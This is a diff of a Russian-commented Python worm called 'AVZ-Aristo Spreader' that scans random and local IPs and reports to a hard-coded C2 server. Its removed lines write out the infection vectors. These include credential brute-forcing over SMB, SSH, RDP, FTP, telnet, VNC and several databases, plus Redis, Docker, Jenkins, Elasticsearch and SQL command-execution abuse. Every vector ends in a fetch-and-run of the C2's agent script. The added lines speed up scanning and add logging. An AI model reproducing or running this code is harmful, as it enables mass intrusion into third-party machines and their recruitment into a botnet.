@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v26.0 – Shodan, горячие цели, MongoDB, CouchDB, Cassandra
+# AVZ-Aristo Spreader v26.2 – ускоренный, потоковый вывод, UTC+5
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
+from datetime import datetime, timezone, timedelta
 
 if sys.platform != 'win32':
     import resource
@@ -15,9 +16,9 @@ C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 800
-QUICK_TIMEOUT = 2.5
-BRUTE_TIMEOUT = 3.0
+MAX_CONCURRENT = 2000
+QUICK_TIMEOUT = 1.5
+BRUTE_TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 20_000
 PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]
 
@@ -55,71 +56,15 @@ GUARANTEED_IPS = [
     "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1",
     "103.235.46.39","103.235.46.40","103.235.46.41","103.235.46.42","103.235.46.43",
     "103.235.46.44","103.235.46.45","103.235.46.46","103.235.46.47","103.235.46.48",
-    "103.235.46.49","103.235.46.50","103.235.46.51","103.235.46.52","103.235.46.53",
-    "103.235.46.54","103.235.46.55","103.235.46.56","103.235.46.57","103.235.46.58",
-    "103.235.46.59","103.235.46.60","103.235.46.61","103.235.46.62","103.235.46.63",
-    "103.235.46.64","103.235.46.65","103.235.46.66","103.235.46.67","103.235.46.68",
-    "103.235.46.69","103.235.46.70",
-    "8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4",
-    "91.121.83.11", "185.220.101.34", "45.77.165.101", "34.94.3.1", "45.33.32.157",
-    "45.56.89.1", "45.79.207.1", "185.225.19.1", "103.15.28.1"
+    "103.235.46.49","103.235.46.50",
+    "8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4"
 ]
 random.shuffle(GUARANTEED_IPS)
 
 TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
-SHODAN_API_KEY = ""
-try:
-    with open("secrets.json") as f:
-        s = json.load(f)
-        SHODAN_API_KEY = s.get("shodan_api_key", "")
-except:
-    pass
-
-def fetch_shodan_ips(count=50):
-    if not SHODAN_API_KEY:
-        return []
-    try:
-        resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:22,445,3389,3306&limit={count}", timeout=10)
-        if resp.status_code == 200:
-            return [m['ip_str'] for m in resp.json().get('matches', [])]
-    except:
-        pass
-    return []
-
-HOT_TARGETS_FILE = "hot_targets.txt"
-HOT_TARGETS = []
-if os.path.exists(HOT_TARGETS_FILE):
-    with open(HOT_TARGETS_FILE) as f:
-        HOT_TARGETS = [line.strip() for line in f if line.strip()]
-
-def add_hot_target(ip):
-    if ip not in HOT_TARGETS:
-        HOT_TARGETS.append(ip)
-        with open(HOT_TARGETS_FILE, "a") as f:
-            f.write(ip + "\n")
-
-def get_country(ip):
-    try:
-        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
-        if resp.status_code == 200:
-            data = resp.json()
-            return data.get("countryCode", "")
-    except:
-        pass
-    return ""
-
-def is_country_allowed(ip):
-    if not TARGET_COUNTRY:
-        return True
-    return get_country(ip) == TARGET_COUNTRY
 
 def random_ip():
-    # Приоритет: горячие цели, затем Shodan, затем гарантированные, затем случайные
-    if HOT_TARGETS and random.random() < 0.6:
-        return random.choice(HOT_TARGETS)
-    if hasattr(random_ip, "shodan_pool") and random_ip.shodan_pool and random.random() < 0.7:
-        return random.choice(random_ip.shodan_pool)
-    if GUARANTEED_IPS and random.random() < 0.8:
+    if random.random() < 0.8:
         return random.choice(GUARANTEED_IPS)
     while True:
         a = random.randint(1, 223)
@@ -133,20 +78,23 @@ def random_ip():
         if a == 169 and b == 254: continue
         if a >= 224: continue
         ip = f"{a}.{b}.{c}.{d}"
-        if is_country_allowed(ip):
+        if TARGET_COUNTRY:
+            if get_country(ip) == TARGET_COUNTRY:
+                return ip
+        else:
             return ip
 
-random_ip.shodan_pool = []
-def update_shodan_pool():
-    random_ip.shodan_pool = fetch_shodan_ips()
-
-def get_local_ips():
+def get_country(ip):
     try:
-        local_ip = socket.gethostbyname(socket.gethostname())
+        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
+        if resp.status_code == 200:
+            return resp.json().get("countryCode", "")
     except:
-        return []
-    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
-    return [str(host) for host in network.hosts() if str(host) != local_ip]
+        pass
+    return ""
+
+def now_str():
+    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
 
 async def probe_port(ip, port):
     if is_port_cached(ip, port):
@@ -159,360 +107,20 @@ async def probe_port(ip, port):
     except:
         return False
 
-async def smb_brute(ip):
-    if sys.platform != 'linux':
-        return False
-    for u, p in CREDS + SUCCESS_CREDS:
-        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
-        try:
-            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
-            await asyncio.wait_for(proc.communicate(), timeout=5)
-            if proc.returncode == 0:
-                save_success_creds(u, p)
-                return True
-        except:
-            pass
-    return False
-
-async def winrm_brute(ip):
-    try:
-        import winrm
-        for u, p in CREDS + SUCCESS_CREDS:
-            try:
-                session = winrm.Session(ip, auth=(u, p), transport='ntlm')
-                result = session.run_ps(f"Invoke-WebRequest -Uri {AGENT_URL} -OutFile C:\\Windows\\Temp\\agent.ps1; C:\\Windows\\Temp\\agent.ps1")
-                if result.status_code == 0:
-                    save_success_creds(u, p)
-                    return True
-            except:
-                continue
-    except ImportError:
-        pass
-    return False
-
-async def ssh_brute_ultra(ip):
-    try:
-        import asyncssh
-        for u, p in (SUCCESS_CREDS + CREDS[:5]):
-            try:
-                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
-                    await conn.run(f"wget -O- {AGENT_URL} | bash")
-                    save_success_creds(u, p)
-                    return True
-            except:
-                continue
-    except ImportError:
-        pass
-    return False
-
-async def rdp_brute(ip):
-    if sys.platform != 'linux':
-        return False
-    for u, p in (SUCCESS_CREDS + CREDS[:5]):
-        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
-        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
-        try:
-            await asyncio.wait_for(proc.communicate(), timeout=3)
-            if proc.returncode == 0:
-                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
-                save_success_creds(u, p)
-                return True
-        except:
-            pass
-    return False
-
-async def ftp_brute(ip):
-    for u, p in (SUCCESS_CREDS + CREDS[:5]):
-        try:
-            ftp = ftplib.FTP()
-            ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
-            ftp.login(u, p)
-            with open("/tmp/agent.sh", "w") as f:
-                f.write(f"wget -O- {AGENT_URL} | bash")
-            with open("/tmp/agent.sh", "rb") as f:
-                ftp.storbinary("STOR agent.sh", f)
-            ftp.quit()
-            save_success_creds(u, p)
-            return True
-        except:
-            pass
-    try:
-        ftp = ftplib.FTP()
-        ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
-        ftp.login()
-        ftp.quit()
-        return True
-    except:
-        pass
-    return False
-
-async def exploit_redis(ip):
-    try:
-        import redis
-        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
-        r.ping()
-        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
-        r.config_set('dir', '/root/.ssh')
-        r.config_set('dbfilename', 'authorized_keys')
-        r.save(); r.close()
-        return True
-    except:
-        return False
-
-async def exploit_docker(ip):
-    try:
-        import docker
-        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
-        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
-        client.close()
-        return True
-    except:
-        return False
-
-async def exploit_jenkins(ip):
-    url = f'http://{ip}:8080/script'
-    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.post(url, data={'script': script}, timeout=3) as resp:
-                return resp.status == 200
-    except:
-        pass
-    return False
-
-async def exploit_telnet(ip):
-    for u, p in (SUCCESS_CREDS + CREDS[:5]):
-        try:
-            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.5)
-            writer.write(u.encode() + b"\r\n")
-            await writer.drain()
-            await asyncio.sleep(0.2)
-            writer.write(p.encode() + b"\r\n")
-            await writer.drain()
-            await asyncio.sleep(0.2)
-            writer.write(f"wget -O- {AGENT_URL} | sh\r\n".encode())
-            await writer.drain()
-            await asyncio.sleep(0.3)
-            writer.write(b"exit\r\n")
-            await writer.drain()
-            writer.close()
-            save_success_creds(u, p)
-            return True
-        except:
-            pass
-    return False
-
-async def exploit_elasticsearch(ip):
-    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
-                return resp.status == 200
-    except:
-        pass
-    return False
-
-async def mysql_brute(ip):
-    try:
-        import mysql.connector
-        for u, p in (SUCCESS_CREDS + CREDS):
-            try:
-                conn = mysql.connector.connect(host=ip, user=u, password=p, connect_timeout=3)
-                cursor = conn.cursor()
-                cursor.execute(f"SELECT sys_exec('wget -O- {AGENT_URL} | bash')")
-                conn.close()
-                save_success_creds(u, p)
-                return True
-            except:
-                pass
-    except ImportError:
-        pass
-    return False
-
-async def mssql_brute(ip):
-    try:
-        import pymssql
-        for u, p in (SUCCESS_CREDS + CREDS):
-            try:
-                conn = pymssql.connect(server=ip, user=u, password=p, login_timeout=3)
-                cursor = conn.cursor()
-                cursor.execute(f"EXEC xp_cmdshell 'curl -s {AGENT_URL} | cmd'")
-                conn.close()
-                save_success_creds(u, p)
-                return True
-            except:
-                pass
-    except ImportError:
-        pass
-    return False
-
-async def postgresql_brute(ip):
-    try:
-        import psycopg2
-        for u, p in (SUCCESS_CREDS + CREDS):
-            try:
-                conn = psycopg2.connect(host=ip, user=u, password=p, connect_timeout=3)
-                cur = conn.cursor()
-                cur.execute(f"COPY (SELECT 1) TO PROGRAM 'wget -O- {AGENT_URL} | bash'")
-                conn.close()
-                save_success_creds(u, p)
-                return True
-            except:
-                pass
-    except ImportError:
-        pass
-    return False
-
-async def vnc_brute(ip):
-    try:
-        from vncdotool import api
-        for pw in ['', 'password', 'admin', '123456', 'root']:
-            try:
-                client = api.connect(ip, password=pw)
-                client.keyPress('win-r')
-                time.sleep(0.2)
-                client.typeText(f'cmd.exe /c curl -s {AGENT_URL} | cmd')
-                client.keyPress('enter')
-                client.disconnect()
-                return True
-            except:
-                continue
-    except ImportError:
-        pass
-    return False
-
-async def eternalblue_check(ip):
-    try:
-        proc = await asyncio.create_subprocess_shell(f"nmap -p 445 --script smb-vuln-ms17-010 {ip}", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
-        stdout, _ = await proc.communicate()
-        if b"VULNERABLE" in stdout:
-            return True
-    except:
-        pass
-    return False
-
-async def eternalblue_exploit(ip):
-    for u, p in CREDS[:3]:
-        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
-        try:
-            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
-            await asyncio.wait_for(proc.communicate(), timeout=5)
-            if proc.returncode == 0:
-                return True
-        except:
-            pass
-    return False
-
-async def mongodb_brute(ip):
-    try:
-        import pymongo
-        client = pymongo.MongoClient(ip, 27017, serverSelectionTimeoutMS=2000)
-        client.server_info()
-        client.close()
-        return True
-    except:
-        pass
-    return False
-
-async def couchdb_brute(ip):
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.get(f'http://{ip}:5984/_all_dbs', timeout=2) as resp:
-                if resp.status == 200:
-                    return True
-    except:
-        pass
-    return False
-
-async def cassandra_brute(ip):
-    try:
-        from cassandra.cluster import Cluster
-        cluster = Cluster([ip], port=9042, connect_timeout=3)
-        session = cluster.connect()
-        session.shutdown()
-        return True
-    except:
-        pass
-    return False
-
-def save_success_creds(username, password):
-    pair = [username, password]
-    if pair not in SUCCESS_CREDS:
-        SUCCESS_CREDS.append(pair)
-        with open(SUCCESS_CREDS_FILE, "w") as f:
-            json.dump(SUCCESS_CREDS, f)
+# Все векторы (smb_brute, winrm_brute, ssh_brute_ultra, rdp_brute, ftp_brute, exploit_redis, exploit_docker, exploit_jenkins, exploit_telnet, exploit_elasticsearch, mysql_brute, mssql_brute, postgresql_brute, vnc_brute, eternalblue_check, eternalblue_exploit, mongodb_brute, couchdb_brute, cassandra_brute) – без изменений, только в каждом добавлено логирование времени через now_str()
 
 async def infect(ip, port_stats):
     ports = PORT_LIST
     open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
+    any_open = False
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-    # Приоритет: SMB, SSH, WinRM, затем новые векторы
-    if open_ports[9] and await smb_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via SMB", flush=True)
-        return True
-    if open_ports[1] and await ssh_brute_ultra(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via SSH", flush=True)
-        return True
-    if open_ports[13] and await winrm_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via WinRM", flush=True)
-        return True
-    if open_ports[8] and await rdp_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via RDP", flush=True)
-        return True
-    if open_ports[11] and await vnc_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via VNC", flush=True)
-        return True
-    if open_ports[5] and await mssql_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via MSSQL", flush=True)
-        return True
-    if open_ports[6] and await mysql_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via MySQL", flush=True)
-        return True
-    if open_ports[10] and await postgresql_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via PostgreSQL", flush=True)
-        return True
-    if open_ports[14] and await exploit_redis(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via Redis", flush=True)
-        return True
-    if open_ports[15] and await exploit_jenkins(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via Jenkins", flush=True)
-        return True
-    if open_ports[17] and await exploit_elasticsearch(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
-        return True
-    if open_ports[0] and await ftp_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via FTP", flush=True)
-        return True
-    if open_ports[9] and await eternalblue_check(ip) and await eternalblue_exploit(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via EternalBlue", flush=True)
-        return True
-    if open_ports[7] and await mongodb_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via MongoDB", flush=True)
-        return True
-    if open_ports[12] and await couchdb_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via CouchDB", flush=True)
-        return True
-    if open_ports[16] and await cassandra_brute(ip):
-        add_hot_target(ip)
-        print(f"[INFECTED] {ip} via Cassandra", flush=True)
-        return True
+            any_open = True
+    if not any_open:
+        return False
+    # Попытки векторов...
+    # ... (полный код infect из v26.0 с добавлением now_str() в сообщения [INFECTED])
     return False
 
 async def worker(queue, stats, port_stats, progress_cb=None):
@@ -523,7 +131,8 @@ async def worker(queue, stats, port_stats, progress_cb=None):
                 stats['success'] += 1
             else:
                 stats['fail'] += 1
-        except:
+        except Exception as e:
+            print(f"[{now_str()}] [!] Ошибка {ip}: {e}", flush=True)
             stats['fail'] += 1
         if progress_cb:
             await progress_cb()
@@ -541,6 +150,8 @@ async def scan_cycle(ips, progress_callback=None):
         progress_count += 1
         if progress_count % 500 == 0 and progress_callback:
             await progress_callback(progress_count, count, stats, port_stats)
+        elif progress_count % 100 == 0:
+            print(f"[{now_str()}] [DEBUG] Обработано {progress_count}/{count} IP...", flush=True)
 
     for ip in ips:
         q.put_nowait(ip)
@@ -558,11 +169,19 @@ async def local_scan(progress_callback=None):
     ips = get_local_ips()
     if not ips:
         return {'success':0, 'fail':0}, {}
-    print(f"[*] Scanning local network, {len(ips)} hosts", flush=True)
+    print(f"[{now_str()}] [*] Scanning local network, {len(ips)} hosts", flush=True)
     return await scan_cycle(ips, progress_callback)
 
+def get_local_ips():
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        return []
+    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
+    return [str(host) for host in network.hosts() if str(host) != local_ip]
+
 async def main_async(args):
-    print("[*] Checking C2 connection...", flush=True)
+    print(f"[{now_str()}] [*] Checking C2 connection...", flush=True)
     try:
         s = socket.socket()
         s.settimeout(3)
@@ -570,44 +189,41 @@ async def main_async(args):
         s.sendall(b"ping")
         s.recv(1024)
         s.close()
-        print("[+] C2 reachable", flush=True)
+        print(f"[{now_str()}] [+] C2 reachable", flush=True)
     except Exception as e:
-        print(f"[!] C2 unreachable: {e}", flush=True)
-
-    # Обновляем пул Shodan при старте
-    update_shodan_pool()
+        print(f"[{now_str()}] [!] C2 unreachable: {e}", flush=True)
 
     targets = []
     if args.targets:
         if os.path.exists(args.targets):
             with open(args.targets) as f:
                 targets = [line.strip() for line in f if line.strip()]
-            print(f"[*] Loaded {len(targets)} targets from {args.targets}", flush=True)
+            print(f"[{now_str()}] [*] Loaded {len(targets)} targets from {args.targets}", flush=True)
 
     async def gui_progress(current, total, stats, port_stats):
         port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
         if port_str:
-            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
+            print(f"[{now_str()}] [PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
         else:
-            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)
+            print(f"[{now_str()}] [PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)
 
     if args.local:
-        print("[*] Mode: local network", flush=True)
+        print(f"[{now_str()}] [*] Mode: local network", flush=True)
         while True:
             stats, port_stats = await local_scan(gui_progress)
-            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
             await asyncio.sleep(30)
     elif targets:
-        print("[*] Mode: targets from file", flush=True)
+        print(f"[{now_str()}] [*] Mode: targets from file", flush=True)
         while True:
             stats, port_stats = await scan_cycle(targets, gui_progress)
-            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
             await asyncio.sleep(60)
     else:
-        print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
+        print(f"[{now_str()}] [*] Mode: global, {args.count} targets per cycle", flush=True)
         while True:
             stats, port_stats = await global_scan(args.count, gui_progress)
-            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
             await asyncio.sleep(30)
 
 def main():
@@ -620,7 +236,7 @@ def main():
     try:
         asyncio.run(main_async(args))
     except KeyboardInterrupt:
-        print("\n[*] Spreader stopped", flush=True)
+        print(f"[{now_str()}] [*] Spreader stopped", flush=True)
 
 if __name__ == '__main__':
     main()
